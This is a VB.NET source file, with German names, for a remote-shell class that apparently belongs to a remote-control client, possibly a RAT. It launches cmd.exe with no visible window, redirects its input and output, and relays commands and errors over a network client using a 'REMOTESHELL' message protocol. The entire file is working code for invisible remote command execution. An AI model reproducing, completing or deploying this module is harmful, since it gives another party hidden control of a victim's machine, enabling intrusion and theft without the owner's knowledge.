Public Class ShellKonsole
    Public Event ShellAnswer(ByVal sText As String)

    Dim CMDProzess As Process
    Dim AbhörThread As System.Threading.Thread
    Public Sub Start()
        On Error Resume Next
        CMDProzess = New Process
        CMDProzess.StartInfo.FileName = "cmd"
        CMDProzess.StartInfo.Arguments = Nothing
        CMDProzess.StartInfo.UseShellExecute = False
        CMDProzess.StartInfo.CreateNoWindow = True
        CMDProzess.StartInfo.RedirectStandardOutput = True
        CMDProzess.StartInfo.RedirectStandardError = True
        CMDProzess.StartInfo.RedirectStandardInput = True
        CMDProzess.Start()
        AbhörThread = New System.Threading.Thread(AddressOf CMD_Abhören)
        AbhörThread.IsBackground = True
        AbhörThread.Start()
    End Sub
    Private Sub CMD_Abhören()
        While True
            Try
                Dim Antwort As String = CMDProzess.StandardOutput.ReadLine
                If Antwort <> "" Then
                    RaiseEvent ShellAnswer(Antwort)
                End If
            Catch ex As Exception
                Form1.Client.Senden("REMOTESHELL#++#ANSWER#++#FALSE#++#Fehler: " & ex.Message)
            End Try
        End While
    End Sub
    Public Sub Schreiben(ByVal stext As String)
        Try
            CMDProzess.StandardInput.WriteLine(stext)
            CMDProzess.StandardInput.Flush()
        Catch ex As Exception
            Form1.Client.Senden("REMOTESHELL#++#ANSWER#++#FALSE#++#Fehler: " & ex.Message)
        End Try
    End Sub
    Public Sub Stopp()
        Try
            CMDProzess.Kill()
            AbhörThread.Abort()
        Catch ex As Exception
            Form1.Client.Senden("REMOTESHELL#++#ANSWER#++#FALSE#++#Fehler: " & ex.Message)
        End Try
    End Sub
End Class
